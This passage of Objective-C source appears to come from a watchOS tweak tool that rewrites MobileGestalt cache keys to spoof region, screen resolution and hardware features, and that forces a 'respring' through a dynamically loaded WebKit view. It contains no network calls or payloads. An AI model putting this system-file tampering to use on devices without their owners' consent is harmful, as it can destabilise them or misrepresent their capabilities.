    NSDictionary *savedExtra = check[@"CacheExtra"];
    for (NSString *key in changes) {
        if (![savedExtra[key] isEqual:changes[key]]) {
            if (err) *err = [NSString stringWithFormat:@"MobileGestalt override %@ did not save the requested value.", key];
            return NO;
        }
    }
    BQLog(@"MG CacheExtra strings updated: %@", changes);
    return YES;
}

static NSString * const kMGRegionCodeKey = @"h63QSdBCiT/z0WU6rdQv6Q";
static NSString * const kMGSalesRegionKey = @"zHeENZu+wbg7PUprwNwBWg";
static NSString * const kMGLegacySalesRegionKey = @"yK+xavymRGZ3xWc1tb8XDg";

NSString *BQGetRegionCode(NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return nil;
    id value = plist[@"CacheExtra"][kMGRegionCodeKey];
    if (value && ![value isKindOfClass:[NSString class]]) {
        if (err) *err = @"RegionCode has an unsupported value type.";
        return nil;
    }
    return value;
}

NSString *BQGetSalesRegion(NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return nil;
    NSDictionary *extra = plist[@"CacheExtra"];
    id current = extra[kMGSalesRegionKey];
    id legacy = extra[kMGLegacySalesRegionKey];
    if ((current && ![current isKindOfClass:[NSString class]]) ||
        (legacy && ![legacy isKindOfClass:[NSString class]])) {
        if (err) *err = @"Sales region has an unsupported value type.";
        return nil;
    }
    if (current && legacy && ![current isEqual:legacy]) {
        if (err) *err = @"Sales region fields disagree; choose a value to align them.";
        return nil;
    }
    return current ?: legacy;
}

BOOL BQSetRegionCode(NSString *code, NSString **err) {
    if (![code isKindOfClass:[NSString class]] || code.length == 0) {
        if (err) *err = @"RegionCode must not be empty.";
        return NO;
    }
    return bq_setMGCacheExtraStrings(@{ kMGRegionCodeKey: code }, err);
}

BOOL BQSetSalesRegion(NSString *suffix, NSString **err) {
    if (![suffix isKindOfClass:[NSString class]] || suffix.length == 0) {
        if (err) *err = @"Sales region suffix must not be empty.";
        return NO;
    }
    if (!BQBackupExists()) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    id cacheExtra = plist[@"CacheExtra"];
    if (![cacheExtra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"MobileGestalt CacheExtra is missing or invalid.", nil);
        return NO;
    }
    NSMutableDictionary *changes = [NSMutableDictionary dictionary];
    if (cacheExtra[kMGSalesRegionKey]) changes[kMGSalesRegionKey] = suffix;
    if (cacheExtra[kMGLegacySalesRegionKey]) changes[kMGLegacySalesRegionKey] = suffix;
    // Newer layouts normally use the current key. Do not add both variants.
    if (changes.count == 0) changes[kMGSalesRegionKey] = suffix;
    return bq_setMGCacheExtraStrings(changes, err);
}

static NSString * const kMGScreenWidthKey = @"g7YQ1Djxh4YiKlEeaoGhzg";
static NSString * const kMGScreenHeightKey = @"OjzOua0LkOegX7pQdgMksw";

BOOL BQGetScreenResolution(NSInteger *width, NSInteger *height, BOOL *overridden, NSString **err) {
    NSMutableDictionary *plist = BQLoadGestalt(err);
    if (!plist) return NO;
    NSDictionary *extra = plist[@"CacheExtra"];
    if (![extra isKindOfClass:[NSDictionary class]]) {
        if (err) *err = NSLocalizedString(@"MobileGestalt CacheExtra is missing or invalid.", nil);
        return NO;
    }
    id storedWidth = extra[kMGScreenWidthKey];
    id storedHeight = extra[kMGScreenHeightKey];
    if ((storedWidth && ![storedWidth isKindOfClass:[NSNumber class]]) ||
        (storedHeight && ![storedHeight isKindOfClass:[NSNumber class]])) {
        if (err) *err = @"Screen dimensions have an unsupported value type.";
        return NO;
    }
    CGSize native = [WKInterfaceDevice currentDevice].screenBounds.size;
    CGFloat scale = [WKInterfaceDevice currentDevice].screenScale;
    NSInteger currentWidth = storedWidth ? [storedWidth integerValue] : (NSInteger)llround(native.width * scale);
    NSInteger currentHeight = storedHeight ? [storedHeight integerValue] : (NSInteger)llround(native.height * scale);
    if (currentWidth <= 0 || currentHeight <= 0) {
        if (err) *err = @"Screen dimensions are invalid.";
        return NO;
    }
    if (width) *width = currentWidth;
    if (height) *height = currentHeight;
    NSDictionary *original = [NSDictionary dictionaryWithContentsOfFile:BQBackupPath()][@"CacheExtra"];
    id originalWidth = original[kMGScreenWidthKey];
    id originalHeight = original[kMGScreenHeightKey];
    if (overridden) *overridden = !((storedWidth == originalWidth || [storedWidth isEqual:originalWidth]) &&
                                   (storedHeight == originalHeight || [storedHeight isEqual:originalHeight]));
    return YES;
}

BOOL BQSetScreenResolution(NSInteger width, NSInteger height, NSString **err) {
    BOOL restore = width == 0 && height == 0;
    if (!restore && !((width == 324 && height == 394) ||
                      (width == 368 && height == 448) ||
                      (width == 352 && height == 430) ||
                      (width == 396 && height == 484) ||
                      (width == 374 && height == 446) ||
                      (width == 416 && height == 496))) {
        if (err) *err = @"Unsupported screen resolution preset.";
        return NO;
    }
    if (!BQBackupExists()) {
        if (err) *err = NSLocalizedString(@"Back up MobileGestalt first.", nil);
        return NO;
    }
    NSMutableDictionary *plist = BQLoadGestalt(err);
    NSDictionary *extra = plist[@"CacheExtra"];
    NSDictionary *backup = [NSDictionary dictionaryWithContentsOfFile:BQBackupPath()];
    NSDictionary *original = backup[@"CacheExtra"];
    if (!plist || ![extra isKindOfClass:[NSDictionary class]] ||
        ![original isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"MobileGestalt or its backup is invalid.";
        return NO;
    }
    NSMutableDictionary *updated = [extra mutableCopy];
    if (restore) {
        for (NSString *key in @[kMGScreenWidthKey, kMGScreenHeightKey]) {
            id value = original[key];
            if (value) updated[key] = value;
            else [updated removeObjectForKey:key];
        }
    } else {
        updated[kMGScreenWidthKey] = @(width);
        updated[kMGScreenHeightKey] = @(height);
    }
    plist[@"CacheExtra"] = updated;
    if (!BQSaveGestalt(plist, err)) return NO;
    NSDictionary *saved = BQLoadGestalt(err)[@"CacheExtra"];
    for (NSString *key in @[kMGScreenWidthKey, kMGScreenHeightKey]) {
        id expected = updated[key];
        id actual = saved[key];
        if (expected ? ![expected isEqual:actual] : actual != nil) {
            if (err) *err = @"Screen resolution write could not be verified.";
            return NO;
        }
    }
    BQLog(@"MG screen dimensions %@", restore ? @"restored from backup" : [NSString stringWithFormat:@"%ld x %ld", (long)width, (long)height]);
    return YES;
}

BOOL BQGetAODSupport(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"2OOJf1VhaM7NxfRok3HbWQ",
        @"j8/Omm6s1lsmTDFsXjsBfA"
    ], enabled, err);
}

BOOL BQGetAODSecondsSupport(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"aoJSd/MXk7M40NgXTM6x+g"
    ], enabled, err);
}

BOOL BQGetActionButton(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"FBw/2WrPE2supEKosxxoTw"
    ], enabled, err);
}

BOOL BQGetDoubleTap(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"l1CWke97nbaAcWDqA6T5LA"
    ], enabled, err);
}

BOOL BQGetDepthCapability(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Ijs+pw5tRyxqSy5kfgZNuQ" // DeviceSupportsAbsoluteDepth
    ], enabled, err);
}

BOOL BQGetAbsoluteAltimeter(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"PFnuFyqMMnGUQQnTqS5byg" // DeviceSupportsAbsoluteAltimeter
    ], enabled, err);
}

BOOL BQGetAlwaysOnCompass(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"aCQx2Qq/TChnNAq1rr6Egw" // DeviceSupportsAlwaysOnCompass
    ], enabled, err);
}

BOOL BQGetAODVibrancy(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"ykpu7qyhqFweVMKtxNylWA" // DeviceSupportsAODVibrancy
    ], enabled, err);
}

BOOL BQGetWatchKeyboard(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"MQJ1mlVrhOwaUUVJehJSVA" // WatchKeyboardCapability
    ], enabled, err);
}

BOOL BQGetPeriodicALSUpdates(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Leuy56dCZmAMYoVCQGTfPA" // DeviceSupportsPeriodicALSUpdates
    ], enabled, err);
}

BOOL BQGetRaiseToSpeak(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"4D8XW4YwJI7QvyPhv1TEdw" // DeviceSupportsRaiseToSpeak
    ], enabled, err);
}

BOOL BQGetContinuousHeartRate(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"W2RPjaqovtsgiRB6ScePGA" // DeviceSupportsContinuousHeartRate
    ], enabled, err);
}

BOOL BQGetCompassOrienteering(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"GPIs61LYNpcwZqwlFr7bbg" // DeviceSupportsCompassOrienteering
    ], enabled, err);
}

BOOL BQGetEnvironmentalDosimetry(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"SaW+DA+cbiqDHrex8MTABA" // DeviceSupportsEnvironmentalDosimetry
    ], enabled, err);
}

BOOL BQGetBatteryInformation(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"Kao6GNYdAy5hwXblxeGYJQ" // DeviceSupportsBatteryInformation
    ], enabled, err);
}

BOOL BQGetAlwaysListening(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"U+73bmG4kBGj6kpreQXUTQ" // DeviceSupportsAlwaysListening
    ], enabled, err);
}

BOOL BQGetRotateToWake(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"nmOy2K5HzAAs2QNAi8wR+Q" // SupportsRotateToWake
    ], enabled, err);
}

BOOL BQGetSwimmingWorkouts(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[
        @"cRjPy4Ef+KZwJ+nfPeBV5Q" // DeviceSupportsSwimmingWorkouts
    ], enabled, err);
}

BOOL BQSetAODSupport(BOOL enabled, NSString **err) {
    // DeviceSupportsAlwaysOnDisplay is the main capability; ClockKit also
    // reads DeviceSupportsAlwaysOnTime while loading CLKDevice information.
    return bq_setMGCacheExtraKeys(@[
        @"2OOJf1VhaM7NxfRok3HbWQ", // DeviceSupportsAlwaysOnDisplay
        @"j8/Omm6s1lsmTDFsXjsBfA"  // DeviceSupportsAlwaysOnTime
    ], enabled, err);
}

BOOL BQSetAODSecondsSupport(BOOL enabled, NSString **err) {
    // Enables the AOD flipbook path used by BacklightServices 1 Hz updates.
    return bq_setMGCacheExtraKeys(@[
        @"aoJSd/MXk7M40NgXTM6x+g" // DeviceSupportsAlwaysOnDisplayFlipbook
    ], enabled, err);
}

BOOL BQSetActionButton(BOOL enabled, NSString **err) {
    // NanoCompassWaypoints 27.3b1 implements isUltraDevice() by calling
    // MGGetBoolAnswer("WatchAppButtonCapability"). The CacheExtra hash below
    // is the matching MobileGestalt key hash present in this build.
    return bq_setMGCacheExtraKeys(@[
        @"FBw/2WrPE2supEKosxxoTw"
    ], enabled, err);
}

BOOL BQSetDoubleTap(BOOL enabled, NSString **err) {
    // WatchGestures' WAGDeviceSupportsElton() calls
    // MGGetBoolAnswer("DeviceSupportsElton"); Double Tap is handled as Elton.
    return bq_setMGCacheExtraKeys(@[
        @"l1CWke97nbaAcWDqA6T5LA" // DeviceSupportsElton
    ], enabled, err);
}

BOOL BQSetDepthCapability(BOOL enabled, NSString **err) {
    // Depth sensor capability used by supported Apple Watch models.
    return bq_setMGCacheExtraKeys(@[
        @"Ijs+pw5tRyxqSy5kfgZNuQ" // DeviceSupportsAbsoluteDepth
    ], enabled, err);
}

BOOL BQSetAbsoluteAltimeter(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"PFnuFyqMMnGUQQnTqS5byg" // DeviceSupportsAbsoluteAltimeter
    ], enabled, err);
}

BOOL BQSetAlwaysOnCompass(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"aCQx2Qq/TChnNAq1rr6Egw" // DeviceSupportsAlwaysOnCompass
    ], enabled, err);
}

BOOL BQSetAODVibrancy(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"ykpu7qyhqFweVMKtxNylWA" // DeviceSupportsAODVibrancy
    ], enabled, err);
}

BOOL BQSetPeriodicALSUpdates(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"Leuy56dCZmAMYoVCQGTfPA" // DeviceSupportsPeriodicALSUpdates
    ], enabled, err);
}

BOOL BQSetWatchKeyboard(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"MQJ1mlVrhOwaUUVJehJSVA" // WatchKeyboardCapability
    ], enabled, err);
}

BOOL BQSetRaiseToSpeak(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"4D8XW4YwJI7QvyPhv1TEdw" // DeviceSupportsRaiseToSpeak
    ], enabled, err);
}

BOOL BQSetContinuousHeartRate(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"W2RPjaqovtsgiRB6ScePGA" // DeviceSupportsContinuousHeartRate
    ], enabled, err);
}

BOOL BQSetCompassOrienteering(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"GPIs61LYNpcwZqwlFr7bbg" // DeviceSupportsCompassOrienteering
    ], enabled, err);
}

BOOL BQSetEnvironmentalDosimetry(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"SaW+DA+cbiqDHrex8MTABA" // DeviceSupportsEnvironmentalDosimetry
    ], enabled, err);
}

BOOL BQSetBatteryInformation(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"Kao6GNYdAy5hwXblxeGYJQ" // DeviceSupportsBatteryInformation
    ], enabled, err);
}

BOOL BQSetAlwaysListening(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"U+73bmG4kBGj6kpreQXUTQ" // DeviceSupportsAlwaysListening
    ], enabled, err);
}

BOOL BQSetRotateToWake(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"nmOy2K5HzAAs2QNAi8wR+Q" // SupportsRotateToWake
    ], enabled, err);
}

BOOL BQSetSwimmingWorkouts(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[
        @"cRjPy4Ef+KZwJ+nfPeBV5Q" // DeviceSupportsSwimmingWorkouts
    ], enabled, err);
}

// These hashes are the MobileGestalt capability fields used by the
// corresponding Intelligence presets. watchOS may ignore fields that its
// build, hardware, language, or Apple services do not support.
BOOL BQGetAppleIntelligence(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[@"A62OafQ85EJAiiqKn4agtg"], enabled, err);
}

BOOL BQGetOnDeviceSiri(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[@"K/R1GfGfCkXvEhaPS2Vrng"], enabled, err);
}

BOOL BQGetAudioIntelligence(BOOL *enabled, NSString **err) {
    return bq_getMGCacheExtraKeys(@[@"rb2tKZxlj0Gm2tBmUQSLqQ"], enabled, err);
}

BOOL BQSetAppleIntelligence(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[@"A62OafQ85EJAiiqKn4agtg"], enabled, err);
}

BOOL BQSetOnDeviceSiri(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[@"K/R1GfGfCkXvEhaPS2Vrng"], enabled, err);
}

BOOL BQSetAudioIntelligence(BOOL enabled, NSString **err) {
    return bq_setMGCacheExtraKeys(@[@"rb2tKZxlj0Gm2tBmUQSLqQ"], enabled, err);
}

// NeoSpring from Gester, with UIKit and WebKit accessed dynamically on watchOS.
static id gRespringWebView;
static id gRespringOverlay;

static id bq_send_id(id object, const char *name) {
    return ((id (*)(id, SEL))objc_msgSend)(object, sel_registerName(name));
}

static id bq_key_window(void) {
    Class applicationClass = NSClassFromString(@"UIApplication");
    id application = bq_send_id(applicationClass, "sharedApplication");
    if (!application) return nil;
    id scenes = bq_send_id(application, "connectedScenes");
    for (id scene in scenes) {
        if (![scene respondsToSelector:sel_registerName("windows")]) continue;
        for (id window in bq_send_id(scene, "windows")) {
            if (((BOOL (*)(id, SEL))objc_msgSend)(window, sel_registerName("isKeyWindow"))) return window;
        }
    }
    if ([application respondsToSelector:sel_registerName("windows")]) {
        return [bq_send_id(application, "windows") firstObject];
    }
    return nil;
}

void BQRespring(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        void *webKit = dlopen("/System/Library/Frameworks/WebKit.framework/WebKit", RTLD_NOW | RTLD_LOCAL);
        if (!webKit) { BQLog(@"respring: WebKit unavailable: %s", dlerror()); return; }
        Class viewClass = NSClassFromString(@"UIView");
        Class colorClass = NSClassFromString(@"UIColor");
        Class spinnerClass = NSClassFromString(@"UIActivityIndicatorView");
        Class configurationClass = NSClassFromString(@"WKWebViewConfiguration");
        Class webViewClass = NSClassFromString(@"WKWebView");
        NSString *path = [[NSBundle mainBundle] pathForResource:@"respring" ofType:@"html"];
        id win = bq_key_window();
        if (!win || !viewClass || !colorClass || !spinnerClass || !configurationClass || !webViewClass || !path.length) {
            BQLog(@"respring: required window, classes or HTML unavailable");
            return;
        }
        CGRect bounds = ((CGRect (*)(id, SEL))objc_msgSend)(win, sel_registerName("bounds"));
        id black = ((id (*)(id, SEL, CGRect))objc_msgSend)(bq_send_id(viewClass, "alloc"), sel_registerName("initWithFrame:"), bounds);
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("setBackgroundColor:"), bq_send_id(colorClass, "blackColor"));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(black, sel_registerName("setAutoresizingMask:"), 18);
        ((void (*)(id, SEL, id))objc_msgSend)(win, sel_registerName("addSubview:"), black);
        id spinner = ((id (*)(id, SEL, NSInteger))objc_msgSend)(bq_send_id(spinnerClass, "alloc"), sel_registerName("initWithActivityIndicatorStyle:"), 101);
        ((void (*)(id, SEL, CGPoint))objc_msgSend)(spinner, sel_registerName("setCenter:"), CGPointMake(CGRectGetMidX(bounds), CGRectGetMidY(bounds)));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(spinner, sel_registerName("setAutoresizingMask:"), 45);
        ((void (*)(id, SEL, id))objc_msgSend)(spinner, sel_registerName("setColor:"), bq_send_id(colorClass, "whiteColor"));
        ((void (*)(id, SEL))objc_msgSend)(spinner, sel_registerName("startAnimating"));
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("addSubview:"), spinner);
        gRespringOverlay = black;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            id config = bq_send_id(configurationClass, "new");
            id preferences = bq_send_id(config, "defaultWebpagePreferences");
            ((void (*)(id, SEL, BOOL))objc_msgSend)(preferences, sel_registerName("setAllowsContentJavaScript:"), YES);
            id webView = ((id (*)(id, SEL, CGRect, id))objc_msgSend)(bq_send_id(webViewClass, "alloc"), sel_registerName("initWithFrame:configuration:"), bounds, config);
            ((void (*)(id, SEL, NSUInteger))objc_msgSend)(webView, sel_registerName("setAutoresizingMask:"), 18);
            ((void (*)(id, SEL, BOOL))objc_msgSend)(webView, sel_registerName("setUserInteractionEnabled:"), NO);
            ((void (*)(id, SEL, id, id))objc_msgSend)(win, sel_registerName("insertSubview:belowSubview:"), webView, black);
            NSURL *url = [NSURL fileURLWithPath:path];
            ((id (*)(id, SEL, id, id))objc_msgSend)(webView, sel_registerName("loadFileURL:allowingReadAccessToURL:"), url, url.URLByDeletingLastPathComponent);
            gRespringWebView = webView;
            BQLog(@"respring: NeoSpring started");
        });
    });
}
